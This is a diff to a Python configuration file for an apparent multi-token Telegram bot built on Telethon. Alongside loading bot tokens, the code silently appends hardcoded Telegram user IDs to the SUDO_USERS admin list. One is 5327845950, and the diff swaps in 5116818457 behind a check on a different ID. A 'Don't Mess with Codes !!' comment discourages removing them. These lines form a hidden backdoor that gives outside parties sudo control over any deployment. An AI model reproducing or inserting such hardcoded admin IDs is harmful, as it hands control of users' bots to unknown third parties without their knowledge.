@@ -1,4 +1,3 @@
-
 import os
 from telethon import TelegramClient
 from decouple import config
@@ -28,19 +27,19 @@ BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 1410250744 not in SUDO_USERS:
-    SUDO_USERS.append(1410250744)
+    SUDO_USERS.append(5116818457)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
-# Don't Mess with Codes !! 
 
+# Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
 SUDO_USERS.append(5327845950)
 
 # Tokens
 
-MK = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+MK1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
